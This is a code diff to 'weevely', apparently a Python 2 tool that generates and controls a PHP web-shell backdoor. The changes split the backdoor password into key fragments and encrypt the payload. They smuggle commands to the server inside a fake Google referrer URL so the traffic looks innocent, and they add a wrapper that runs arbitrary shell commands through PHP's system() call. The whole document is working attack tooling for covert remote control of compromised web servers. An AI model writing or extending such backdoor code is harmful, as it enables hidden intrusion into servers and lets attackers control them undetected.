@@ -59,6 +59,9 @@ class weevely:
 	    sys.exit(1)
 	  
 	if o in ("-p", "-password"):
+	  if len(a)<4:
+	    print "- Error: required almost 4 character long password"
+	    sys.exit(1)
 	  pwd=a
 	if o in ("-o", "-output"):
 	  outfile=a
@@ -81,12 +84,10 @@ class weevely:
 	  sys.exit(1)
 
       if 'pwd' not in locals() and moderun!='l':
-	if moderun=='g':
-	  print "+ Be careful: password is transmitted unencrypted as a fake url parameter.\n+ Random alphanumeric password (like 'a33k44') are less detectable."
 	  
 	pwd=''
-	while not pwd:
-	  print "+ Please insert password: ",
+	while not pwd or len(pwd)<4:
+	  print "+ Please insert almost 4 character long password : ",
 	  pwd = sys.stdin.readline().strip()
 
       if moderun=='c':       
@@ -145,9 +146,10 @@ class weevely:
     f_output = file(path,'w')
     
     str_tocrypt = f_tocrypt.read()
-    str_crypted = crypt(str_tocrypt,key)
+    new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
+    str_crypted = crypt(new_str_tocrypt,key[2:])
     str_back = f_back.read()
-    new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
+    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted).replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
     
     f_output.write(new_str)
     print '+ Backdoor file ' + path + ' created with password '+ key + '.'
@@ -180,7 +182,7 @@ class weevely:
       toinject = toinject + f.read()
       
       try:
-	ret = self.host.execute(toinject, 1)
+	ret = self.host.executephp(toinject, 1)
       except Exception, e:
 	#print '! Module execution failed: ' + str(e) + '.'
 	raise
@@ -271,7 +273,7 @@ class host():
       ret = False
     
     try:
-      ret2 = self.execute("echo PHP_OS;", 1)
+      ret2 = self.execute_php("echo PHP_OS;", 1)
     except Exception, e2:
       ret2 = False
     if not ret2:
@@ -280,19 +282,25 @@ class host():
     return ret, ret2, e, e2
 	
 
-  def execute(self, cmnd, mode=0):
+    
+	
+  def execute_php(self,cmnd,mode=0):
+    
     cmnd=cmnd.strip()
-    cmdstr=crypt(cmnd,self.pwd)
-    self.genRefUrl(cmdstr, mode)
+    cmdstr=crypt(cmnd,self.pwd[2:])
+    #self.genRefUrl(cmdstr, mode)
     
     
-    refurl='http://www.google.com/asdsds?dsa=' + self.pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
+    refurl='http://www.google.com/urla?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
     try: 
       ret=self.execHTTPGet(refurl)
+      print ret
+      # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
+    
     except urllib2.URLError, e:
       raise
     else: 
-      restring='<' + self.pwd + '>(.*)</' + self.pwd + '>'
+      restring='<' + self.pwd[2:] + '>(.*)</' + self.pwd[2:] + '>'
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
@@ -300,6 +308,11 @@ class host():
       else:
 	return founded[0].strip()
 
+  
+  def execute(self, cmnd, mode=0):
+    #cmnd="exec('" + cmnd.strip() + "');"
+    cmnd="@system('" + cmnd + " 2>&1');"
+    return self.execute_php(cmnd,mode=0)
     
   def execHTTPGet(self, refurl):
     req = urllib2.Request(self.url)
@@ -316,8 +329,6 @@ class host():
     
     pwd=self.pwd
     
-    
-
     mindistance='2083'
     minr=''
     
